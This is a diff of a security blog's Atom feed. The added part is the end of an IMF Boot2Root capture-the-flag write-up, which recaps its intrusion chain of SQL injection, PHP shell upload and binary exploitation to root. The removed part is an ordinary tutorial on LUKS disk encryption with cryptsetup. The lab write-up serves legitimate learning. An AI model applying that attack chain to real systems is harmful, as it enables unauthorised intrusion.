+</span><span class='line'>Congratulations on finishing the IMF Boot2Root CTF. I hope you enjoyed it.
+</span><span class='line'>Thank you for trying this challenge and please send any feedback.
+</span><span class='line'>
+</span><span class='line'>Geckom
+</span><span class='line'>Twitter: @g3ck0ma
+</span><span class='line'>Email: geckom@redteamr.com
+</span><span class='line'>Web: http://redteamr.com
+</span><span class='line'>
+</span><span class='line'>Special Thanks
+</span><span class='line'>Binary Advice: OJ (@TheColonial) and Justin Stevens (@justinsteven)
+</span><span class='line'>Web Advice: Menztrual (@menztrual)
+</span><span class='line'>Testers: dook (@dooktwit), Menztrual (@menztrual), llid3nlq and OJ(@TheColonial)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And the final decoded flag is <code>Gh0stProt0c0ls</code>! This was a really nice challenge in the later stages, especially from flag 3 onwards! Hats off to Geckom and the collaborators for this interesting VM!</p>
+
+<p>As a recap, from only a web server available to root:</p>
+
+<ul>
+<li>HTML source &ndash;> JS included files &ndash;> PHP function exploitation &ndash;> SQLi &ndash;> directory bruteforcing &ndash;> PHP shell upload &ndash;> binary exploitation &ndash;> root</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
+</span><span class='line'>/ It is by the fortune of God that, in   \
+</span><span class='line'>| this country, we have three benefits:  |
+</span><span class='line'>| freedom of speech, freedom of thought, |
+</span><span class='line'>| and the wisdom never to use either.    |
+</span><span class='line'>|                                        |
+</span><span class='line'>\ -- Mark Twain                          /
+</span><span class='line'> ----------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Hackfest 2016: Quaoar]]></title>
@@ -12721,406 +13862,6 @@ This used to be <code>/etc/sysctl.conf</code> , and can still be used, but newer
 </span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
 
 
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[LFCS prep - Managing encrypted partitions]]></title>
-    <link href="http://chousensha.github.io/blog/2018/02/12/lfcs-prep-managing-encrypted-partitions/"/>
-    <updated>2018-02-12T12:39:28-05:00</updated>
-    <id>http://chousensha.github.io/blog/2018/02/12/lfcs-prep-managing-encrypted-partitions</id>
-    <content type="html"><![CDATA[<p>Today we&rsquo;ll go over creating LUKS-encrypted partitions with <strong>cryptsetup</strong>. LUKS (Linux Unified Key Setup) is a block device encryption format that is the standard on Linux systems. Also, because it stores all the necessary data in the partition header, it&rsquo;s easy to migrate partitions.</p>
-
-<!-- more -->
-
-
-<p>To get an overview of all the cryptographic ciphers that the system can use, look in <code>/proc/crypto</code>:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'> cat /proc/crypto | grep name
-</span><span class='line'>name         : crc32
-</span><span class='line'>name         : __ghash
-</span><span class='line'>name         : ghash
-</span><span class='line'>name         : __ghash
-</span><span class='line'>name         : xts(aes)
-</span><span class='line'>name         : lrw(aes)
-</span><span class='line'>name         : __xts-aes-aesni
-</span><span class='line'>name         : __lrw-aes-aesni
-</span><span class='line'>name         : pcbc(aes)
-</span><span class='line'>name         : rfc4106(gcm(aes))
-</span><span class='line'>name         : __gcm-aes-aesni
-</span><span class='line'>name         : ctr(aes)
-</span><span class='line'>name         : __ctr-aes-aesni
-</span><span class='line'>name         : cbc(aes)
-</span><span class='line'>name         : __ecb-aes-aesni
-</span><span class='line'>name         : ecb(aes)
-</span><span class='line'>name         : __cbc-aes-aesni
-</span><span class='line'>name         : __ecb-aes-aesni
-</span><span class='line'>name         : __aes-aesni
-</span><span class='line'>name         : aes
-</span><span class='line'>name         : crct10dif
-</span><span class='line'>name         : crct10dif
-</span><span class='line'>name         : crc32c
-</span><span class='line'>name         : hmac(sha256)
-</span><span class='line'>name         : hmac(sha1)
-</span><span class='line'>name         : lzo
-</span><span class='line'>name         : crc32c
-</span><span class='line'>name         : aes
-</span><span class='line'>name         : sha224
-</span><span class='line'>name         : sha256
-</span><span class='line'>name         : sha1
-</span><span class='line'>name         : md5
-</span><span class='line'>name         : sha224
-</span><span class='line'>name         : sha256
-</span><span class='line'>name         : sha1
-</span><span class='line'>name         : aes</span></code></pre></td></tr></table></div></figure>
-
-
-<p>For this demo, I will be using a 200MB partition called /dev/sdb1. The below command initializes the partition as a LUKS device and you have to configure a passphrase at this step.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup luksFormat /dev/sdb1
-</span><span class='line'>
-</span><span class='line'>WARNING!
-</span><span class='line'>========
-</span><span class='line'>This will overwrite data on /dev/sdb1 irrevocably.
-</span><span class='line'>
-</span><span class='line'>Are you sure? (Type uppercase yes): YES
-</span><span class='line'>Enter passphrase: 
-</span><span class='line'>Verify passphrase: </span></code></pre></td></tr></table></div></figure>
-
-
-<p>You can check out the header:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup luksDump /dev/sdb1
-</span><span class='line'>LUKS header information for /dev/sdb1
-</span><span class='line'>
-</span><span class='line'>Version:           1
-</span><span class='line'>Cipher name:       aes
-</span><span class='line'>Cipher mode:       xts-plain64
-</span><span class='line'>Hash spec:         sha256
-</span><span class='line'>Payload offset:    4096
-</span><span class='line'>MK bits:           256
-</span><span class='line'>MK digest:         6b 5e c2 bb 77 f9 0a 0d d4 67 4d 6f 01 a1 df 33 ce d7 94 b2 
-</span><span class='line'>MK salt:           42 9d d7 5f 3b 6c c1 0b 55 53 d1 fd 28 bd 73 27 
-</span><span class='line'>                   64 63 bb 70 02 de 33 46 0c 4f 2e 07 a9 a7 28 52 
-</span><span class='line'>MK iterations:     68500
-</span><span class='line'>UUID:              85b6a404-b24e-4c31-baf3-75cb3f041054
-</span><span class='line'>
-</span><span class='line'>Key Slot 0: ENABLED
-</span><span class='line'>    Iterations:             547007
-</span><span class='line'>    Salt:                   4d 13 8b 20 74 cb 88 dd 8e dc b3 b0 2c ca 83 4b 
-</span><span class='line'>                              bd ab 12 2d 95 57 72 06 00 25 11 0e 43 b8 dc 81 
-</span><span class='line'>    Key material offset:    8
-</span><span class='line'>    AF stripes:                4000
-</span><span class='line'>Key Slot 1: DISABLED
-</span><span class='line'>Key Slot 2: DISABLED
-</span><span class='line'>Key Slot 3: DISABLED
-</span><span class='line'>Key Slot 4: DISABLED
-</span><span class='line'>Key Slot 5: DISABLED
-</span><span class='line'>Key Slot 6: DISABLED
-</span><span class='line'>Key Slot 7: DISABLED</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Next, create a mapping between the opened LUKS partition and the device mapper.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup --verbose luksOpen /dev/sdb1 hidden
-</span><span class='line'>Enter passphrase for /dev/sdb1: 
-</span><span class='line'>Key slot 0 unlocked.
-</span><span class='line'>Command successful.</span></code></pre></td></tr></table></div></figure>
-
-
-<p>View the mapping details:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>ls -l /dev/mapper/hidden 
-</span><span class='line'>lrwxrwxrwx. 1 root root 7 Feb  9 18:29 /dev/mapper/hidden -&gt; ../dm-2</span></code></pre></td></tr></table></div></figure>
-
-
-<p>If you want to have more insight into the status of the mapping:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup -v status hidden
-</span><span class='line'>/dev/mapper/hidden is active.
-</span><span class='line'>  type:    LUKS1
-</span><span class='line'>  cipher:  aes-xts-plain64
-</span><span class='line'>  keysize: 256 bits
-</span><span class='line'>  device:  /dev/sdb1
-</span><span class='line'>  offset:  4096 sectors
-</span><span class='line'>  size:    405504 sectors
-</span><span class='line'>  mode:    read/write
-</span><span class='line'>Command successful.</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Format the partition with the filesystem of your choice:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>mkfs -t ext4 /dev/mapper/hidden
-</span><span class='line'>mke2fs 1.42.9 (28-Dec-2013)
-</span><span class='line'>Filesystem label=
-</span><span class='line'>OS type: Linux
-</span><span class='line'>Block size=1024 (log=0)
-</span><span class='line'>Fragment size=1024 (log=0)
-</span><span class='line'>Stride=0 blocks, Stripe width=0 blocks
-</span><span class='line'>50800 inodes, 202752 blocks
-</span><span class='line'>10137 blocks (5.00%) reserved for the super user
-</span><span class='line'>First data block=1
-</span><span class='line'>Maximum filesystem blocks=33816576
-</span><span class='line'>25 block groups
-</span><span class='line'>8192 blocks per group, 8192 fragments per group
-</span><span class='line'>2032 inodes per group
-</span><span class='line'>Superblock backups stored on blocks: 
-</span><span class='line'>    8193, 24577, 40961, 57345, 73729
-</span><span class='line'>
-</span><span class='line'>Allocating group tables: done                            
-</span><span class='line'>Writing inode tables: done                            
-</span><span class='line'>Creating journal (4096 blocks): done
-</span><span class='line'>Writing superblocks and filesystem accounting information: done </span></code></pre></td></tr></table></div></figure>
-
-
-<p>I made a folder for mounting the new encrypted partition and mounted it:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>mount -v /dev/mapper/hidden /mnt/hidden
-</span><span class='line'>mount: /mnt/hidden does not contain SELinux labels.
-</span><span class='line'>       You just mounted an file system that supports labels which does not
-</span><span class='line'>       contain labels, onto an SELinux box. It is likely that confined
-</span><span class='line'>       applications will generate AVC messages and not be allowed access to
-</span><span class='line'>       this file system.  For more details see restorecon(8) and mount(8).
-</span><span class='line'>mount: /dev/mapper/hidden mounted on /mnt/hidden.</span></code></pre></td></tr></table></div></figure>
-
-
-<p>When done working on it, you can unmount it:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>umount -v /mnt/hidden
-</span><span class='line'>umount: /mnt/hidden (/dev/mapper/hidden) unmounted</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And then remove the mapping:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup --verbose luksClose hidden
-</span><span class='line'>Command successful.</span></code></pre></td></tr></table></div></figure>
-
-
-<p>To remount it, just go through the above steps again. If you want to mount it at boot, you need to take note of some UUIDS:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>lsblk -o name,uuid,mountpoint
-</span><span class='line'>NAME          UUID                                   MOUNTPOINT
-</span><span class='line'>sda                                                  
-</span><span class='line'>├─sda1        b8e2fb99-bf4c-4632-883b-8ed5c2350b1e   /boot
-</span><span class='line'>└─sda2        PLxZXl-aHBf-9VPQ-XOd1-eLMH-cWOW-NhjdcP 
-</span><span class='line'>  ├─rhel-root 2c0268ac-c31a-462d-b5b9-41bdfbecd75d   /
-</span><span class='line'>  └─rhel-swap 6544d880-b634-4566-a68d-d3a58cec4cf6   [SWAP]
-</span><span class='line'>sdb                                                  
-</span><span class='line'>└─sdb1        85b6a404-b24e-4c31-baf3-75cb3f041054   
-</span><span class='line'>  └─hidden    ab98b274-9d34-41f0-9178-4f8c4b7e8a77   
-</span><span class='line'>sr0                                                  </span></code></pre></td></tr></table></div></figure>
-
-
-<p>Then you need to edit <code>/etc/crypttab</code>:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>name device &lt;password&gt; &lt;options&gt;</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Device refers to the block device or its UUID. The entries between tags are optional. In my case, the entry would look like this (the UUID is of /dev/sdb1)</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/crypttab 
-</span><span class='line'>hidden UUID=85b6a404-b24e-4c31-baf3-75cb3f041054</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And edit /etc/fstab like you would for any other partition (UUID refers to the hidden mapping):</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>UUID=ab98b274-9d34-41f0-9178-4f8c4b7e8a77 /mnt/hidden ext4 defaults 0 0</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Now you will be prompted at boot for the password. If you want to use a key for automatic unlocking, create a key file (here a random key of 4096 bytes length):</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>dd if=/dev/urandom of=/root/key bs=1024 count=4 
-</span><span class='line'>4+0 records in
-</span><span class='line'>4+0 records out
-</span><span class='line'>4096 bytes (4.1 kB) copied, 0.00100253 s, 4.1 MB/s</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Make it only readable by root with <code>chmod 400 /root/key</code></p>
-
-<p>Add the key for the encrypted volume:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup -v luksAddKey /dev/sdb1 /root/key
-</span><span class='line'>Enter any existing passphrase: 
-</span><span class='line'>Key slot 0 unlocked.
-</span><span class='line'>Key slot 0 unlocked.
-</span><span class='line'>Command successful.</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And add the path of the key file to /etc/crypttab</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/crypttab 
-</span><span class='line'>hidden UUID=85b6a404-b24e-4c31-baf3-75cb3f041054 /root/key</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Now the volume will be unlocked automatically without the need of entering a passphrase.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
-</span><span class='line'>/ You definitely intend to start living \
-</span><span class='line'>\ sometime soon.                        /
-</span><span class='line'> ---------------------------------------
-</span><span class='line'>        \   ^__^
-</span><span class='line'>         \  (oo)\_______
-</span><span class='line'>            (__)\       )\/\
-</span><span class='line'>                ||----w |
-</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
 
 ]]></content>
   </entry>
